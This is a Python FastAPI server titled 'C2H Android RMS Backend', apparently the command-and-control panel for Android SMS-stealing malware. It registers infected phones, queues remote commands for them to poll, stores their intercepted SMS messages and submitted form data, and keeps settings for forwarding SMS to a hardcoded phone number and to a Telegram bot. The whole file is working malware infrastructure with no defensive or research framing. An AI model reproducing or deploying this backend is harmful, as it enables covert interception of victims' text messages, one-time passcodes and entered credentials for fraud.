import uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta, timezone
import sqlite3
import json
import os

# --- Configuration ---
DATABASE_URL = "rms.db"
ONLINE_THRESHOLD_SECONDS = 20

# --- Database Initialization ---
def get_db_connection():
    conn = sqlite3.connect(DATABASE_URL, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def now_utc_string():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL
        );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_device_id ON devices (device_id);")

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    """)
    
    # Default settings
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('sms_forward_number', '9923255555'))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_bot_token', ''))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_chat_id', ''))
    
    conn.commit()
    conn.close()

init_db()

# --- Pydantic Models ---
class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None

class DeviceResponse(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None
    is_online: bool
    created_at: str
    last_seen: str

class SmsForwardConfigRequest(BaseModel):
    forward_number: str

class TelegramConfigRequest(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

class SendCommandRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: Dict[str, Any]

class FormSubmissionRequest(BaseModel):
    custom_data: str

class SmsLogRequest(BaseModel):
    sender: str
    message_body: str

# --- FastAPI Application ---
app = FastAPI(
    title="C2H Android RMS Backend",
    description="Complete Web Panel for Device Control",
    version="3.0.0"
)

# --- API Endpoints ---

@app.get("/")
async def root():
    """Root endpoint - redirects to panel"""
    return HTMLResponse(content=open(__file__).read().split('HTML_CONTENT_START')[1].split('HTML_CONTENT_END')[0] if 'HTML_CONTENT_START' in open(__file__).read() else '<h1>Panel</h1>')

@app.post("/api/device/register")
async def register_device(data: DeviceRegisterRequest):
    """डिवाइस रजिस्टर करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    current_time_str = now_utc_string()
    clean_device_id = data.device_id.strip()

    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    
    if device:
        cursor.execute(
            """
            UPDATE devices 
            SET device_name = ?, os_version = ?, phone_number = ?, battery_level = ?, last_seen = ?
            WHERE device_id = ?
            """,
            (
                data.device_name, data.os_version, data.phone_number, 
                data.battery_level, current_time_str, clean_device_id
            )
        )
    else:
        cursor.execute(
            """
            INSERT INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                clean_device_id, data.device_name, data.os_version, 
                data.phone_number, data.battery_level, current_time_str, current_time_str
            )
        )
        
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Device data updated successfully."}

@app.get("/api/devices", response_model=List[DeviceResponse])
async def get_devices():
    """सभी डिवाइस की लिस्ट लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    devices = cursor.fetchall()
    response_list = []
    current_time_utc = datetime.now(timezone.utc)
    for device in devices:
        try:
            last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        except (ValueError, TypeError):
            last_seen_dt = current_time_utc - timedelta(days=1)
        is_online = (current_time_utc - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
        response_list.append(DeviceResponse(
            device_id=device['device_id'],
            device_name=device['device_name'] or "Unknown Device",
            os_version=device['os_version'] or "Unknown",
            phone_number=device['phone_number'] or "No Number",
            battery_level=device['battery_level'] or 0,
            is_online=is_online,
            created_at=device['created_at'],
            last_seen=device['last_seen']
        ))
    conn.close()
    return response_list

@app.post("/api/config/sms_forward")
async def update_sms_forward_config(data: SmsForwardConfigRequest):
    """SMS फॉरवर्ड नंबर अपडेट करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
        ('sms_forward_number', data.forward_number)
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Forwarding number updated."}

@app.post("/api/config/telegram")
async def update_telegram_config(data: TelegramConfigRequest):
    """टेलीग्राम कॉन्फिग अपडेट करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
        ('telegram_bot_token', data.telegram_bot_token)
    )
    cursor.execute(
        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
        ('telegram_chat_id', data.telegram_chat_id)
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Telegram config updated."}

@app.get("/api/config/sms_forward")
async def get_sms_forward_config():
    """SMS फॉरवर्ड नंबर लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
    result = cursor.fetchone()
    conn.close()
    return {"forward_number": result['setting_value'] if result else "9923255555"}

@app.get("/api/config/telegram")
async def get_telegram_config():
    """टेलीग्राम कॉन्फिग लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')")
    results = {row['setting_key']: row['setting_value'] for row in cursor.fetchall()}
    conn.close()
    return {
        "telegram_bot_token": results.get('telegram_bot_token', ''),
        "telegram_chat_id": results.get('telegram_chat_id', '')
    }

@app.post("/api/command/send")
async def send_command(data: SendCommandRequest):
    """डिवाइस को कमांड भेजें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO commands (device_id, command_type, command_data, created_at) VALUES (?, ?, ?, ?)",
        (data.device_id.strip(), data.command_type, json.dumps(data.command_data), now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Command sent."}

@app.get("/api/device/{device_id}/commands")
async def get_pending_commands(device_id: str):
    """डिवाइस के पेंडिंग कमांड लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
        (device_id.strip(),)
    )
    commands = cursor.fetchall()
    command_list = [{"id": cmd['id'], "command_type": cmd['command_type'], "command_data": json.loads(cmd['command_data'])} for cmd in commands]
    if command_list:
        command_ids = [cmd['id'] for cmd in command_list]
        placeholders = ','.join('?' * len(command_ids))
        cursor.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", command_ids)
        conn.commit()
    conn.close()
    return command_list

@app.post("/api/command/{command_id}/execute")
async def mark_command_executed(command_id: int):
    """कमांड को एक्जीक्यूटेड मार्क करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (command_id,))
    conn.commit()
    conn.close()
    return {"status": "success", "message": f"Command {command_id} executed."}

@app.post("/api/device/{device_id}/forms")
async def submit_form(device_id: str, data: FormSubmissionRequest):
    """फॉर्म डेटा सेव करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES (?, ?, ?)",
        (device_id.strip(), data.custom_data, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Form data submitted."}

@app.get("/api/device/{device_id}/forms")
async def get_form_submissions(device_id: str):
    """डिवाइस के फॉर्म डेटा लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC", (device_id.strip(),))
    forms = cursor.fetchall()
    conn.close()
    return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]

@app.post("/api/device/{device_id}/sms")
async def log_sms(device_id: str, data: SmsLogRequest):
    """SMS लॉग करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES (?, ?, ?, ?)",
        (device_id.strip(), data.sender, data.message_body, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "SMS logged."}

@app.get("/api/device/{device_id}/sms")
async def get_sms_logs(device_id: str):
    """डिवाइस के SMS लॉग लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", (device_id.strip(),))
    sms_logs = cursor.fetchall()
    conn.close()
    return [{"id": sms['id'], "sender": sms['sender'], "message_body": sms['message_body'], "received_at": sms['received_at']} for sms in sms_logs]

@app.delete("/api/device/{device_id}")
async def delete_device(device_id: str):
    """डिवाइस डिलीट करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    clean_device_id = device_id.strip()
    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    if not device:
        conn.close()
        raise HTTPException(status_code=404, detail="Device not found.")
    
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM sms_logs WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM form_submissions WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM commands WHERE device_id = ?", (clean_device_id,))
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Device and all data deleted."}

@app.get("/status")
async def status_check():
    """Status check endpoint"""
    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2H RMS Status</title>
        <style>
            body{font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#121212;color:#fff}
            .container{text-align:center;padding:40px;border-radius:15px;background-color:#1e1e1e;box-shadow:0 10px 25px rgba(0,0,0,0.5)}
            h1{color:#00bfff;margin-bottom:10px}
            p{color:#b0b0b0}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ C2H RMS Backend is Running</h1>
            <p>The server is deployed and fully operational.</p>
            <p>API Documentation available at <a href="/docs" style="color:#7b1fa2">/docs</a>.</p>
        </div>
    </body>
    </html>
    """)

# HTML_CONTENT_START
# HTML_CONTENT_END

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)
